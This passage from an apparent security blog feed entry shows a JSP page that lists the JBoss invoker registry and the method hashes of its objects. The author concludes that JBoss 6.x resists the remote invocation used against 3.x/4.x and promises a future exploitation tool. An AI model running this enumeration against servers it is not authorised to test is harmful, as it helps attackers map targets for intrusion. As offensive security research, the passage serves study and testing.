</span><span class='line'>&lt;%@ page import="javax.management.ObjectName"%&gt;
</span><span class='line'>&lt;%@ page import="org.jboss.invocation.MarshalledInvocation"%&gt;
</span><span class='line'>&lt;%
</span><span class='line'>    Iterator it = Registry.entries.entrySet().iterator();
</span><span class='line'>    while (it.hasNext()){
</span><span class='line'>        Map.Entry pairs = (Map.Entry)it.next();
</span><span class='line'>        out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
</span><span class='line'>
</span><span class='line'>        // check for ObjectName
</span><span class='line'>        if (pairs.getKey() instanceof ObjectName){
</span><span class='line'>            Long hash;
</span><span class='line'>            Method[] methods = pairs.getValue().getClass().getMethods();
</span><span class='line'>            for (int m = 0; m &lt; methods.length; ++m){
</span><span class='line'>                Method method = methods[m];
</span><span class='line'>                hash = new Long(MarshalledInvocation.calculateHash(method));
</span><span class='line'>                out.println("Method: " + method + "  Hash: " + hash + " (" + method.hashCode() + ")" + "&lt;br/&gt;");
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        out.println("Key class: " + pairs.getKey().getClass() + "&lt;br/&gt;");
</span><span class='line'>        it.remove();
</span><span class='line'>    }
</span><span class='line'>%&gt;</span></code></pre></td></tr></table></div></figure>


<p>Which gives us:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_6x_methods.jpg"></p>

<p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>

<p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
]]></content>
  </entry>
  
</feed>
